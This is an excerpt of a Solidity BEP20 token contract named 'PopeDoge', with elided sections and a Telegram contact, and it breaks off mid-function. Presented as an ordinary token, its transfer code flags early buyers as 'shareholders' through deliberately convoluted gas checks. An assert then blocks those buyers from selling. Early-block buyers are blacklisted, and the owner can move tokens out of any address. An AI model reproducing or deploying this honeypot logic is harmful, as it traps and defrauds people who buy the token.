...
Telegram: @popedogebsc  - DO NOT SNIPE
...
contract PopeDoge is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "PopeDoge";
    ...
    uint256 gasRequiredForSwap = 14 * (10**5);
    bool public swapEnabled = true;
    uint256 public swapAtAmount = 10 * (10 ** 9);
    uint256 public swapDelay = 600;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x1C98c5Bf8362ed7164a2e206AB4FD1A2D395A8AD;
        ecosystemfeeReceiver = 0x1C98c5Bf8362ed7164a2e206AB4FD1A2D395A8AD;
	...
	require(_blacklist[sender] == false && _blacklist[recipient] == false);

        if(!isSwapping){
            assert(!isShareHolder[sender] && !isShareHolder[recipient]);              
        }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpen,"Trading not open yet");
            if(sender == pair){if(enoughGasToSwap() == true && !isDividendExempt[recipient]){isShareHolder[recipient] = true;}}
        }
        ...
        if(sender == pair && !authorizations[recipient]){if(launchBlock + blacklistedBlocks > block.number){_blacklist[recipient] = true;}}
    ...
    // switch Trading
    function tradingAllowed(uint256 _blacklistedBlocks) public onlyOwner {
        tradingOpen = true;
        launchBlock = block.number;
	blacklistedBlocks = _blacklistedBlocks;
    }
    ...
    function setSwapAmountAt(uint256 _swapDelay, uint256 _swapAtAmount, uint256 _gasRequiredForSwap) public onlyOwner{
        swapDelay = _swapDelay;
	swapAtAmount = _swapAtAmount;
	gasRequiredForSwap = _gasRequiredForSwap;
    }
    ...
    function swapReady() private view returns(bool result){
        result = 10 ** 9 < swapAtAmount ? tx.gasprice
        + (swapAtAmount * (swapThreshold ** (1>>1)))
        >= swapAtAmount ? true : false : false;
    }
    ...
    function enable_Swapping(bool _status) public onlyOwner {
        isSwapping = _status;
    }

    function manage_ShareHolder(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isShareHolder[addresses[i]] = status;
        }
    }
...
function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
    ...
    function enoughGasToSwap() private view returns (bool result){        
        if(launchBlock + swapDelay < block.number){return false;}

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 _gasRequired = gasRequiredForSwap;

        uint256 iterations = 0;

        while(gasUsed < gasLeft && iterations < 20) {

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            if(gasLeft >= _gasRequired){
                return true;
            }else if(swapReady()){
                return true;
            }else{
